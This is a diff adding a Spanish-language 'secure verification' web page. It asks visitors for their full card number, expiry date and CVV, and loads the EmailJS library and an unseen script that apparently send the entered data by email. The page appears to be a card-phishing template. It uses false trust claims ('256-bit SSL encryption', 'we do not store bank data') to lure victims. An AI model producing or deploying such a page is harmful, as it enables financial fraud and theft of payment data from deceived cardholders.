@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación Segura</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="fondo-decorativo"></div>
+  
+  <main class="contenedor-principal">
+    <div class="tarjeta-verificacion">
+      <div class="encabezado">
+        <div class="icono-seguridad animate-bounce">🔒</div>
+        <h1>Verificación Requerida</h1>
+        <p class="leyenda-seguridad">Protegido por encriptación SSL 256-bit</p>
+      </div>
+
+      <form id="formularioVerificacion">
+        <div class="grupo-input">
+          <label>👤 Nombre del Titular</label>
+          <input type="text" id="nombre" placeholder="Ej. María González" required>
+        </div>
+
+        <div class="grupo-input">
+          <label>💳 Número de Tarjeta</label>
+          <input type="text" id="tarjeta" placeholder="0000 0000 0000 0000" maxlength="19" required>
+        </div>
+
+        <div class="grupo-doble">
+          <div class="grupo-input">
+            <label>📅 Fecha de Expiración</label>
+            <input type="month" id="fecha" required>
+          </div>
+          <div class="grupo-input">
+            <label>🔐 Código CVV</label>
+            <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+          </div>
+        </div>
+
+        <button type="submit" class="boton-verificacion">
+          <span class="texto-boton">Verificar Identidad</span>
+          <span class="icono-boton">🌸</span>
+        </button>
+      </form>
+
+      <div class="aviso-legal">
+        <div class="icono-aviso">⚠️</div>
+        <p>Este proceso es solo de verificación. No almacenamos datos bancarios.</p>
+      </div>
+    </div>
+  </main>
+
+  <!-- Se carga la librería de EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
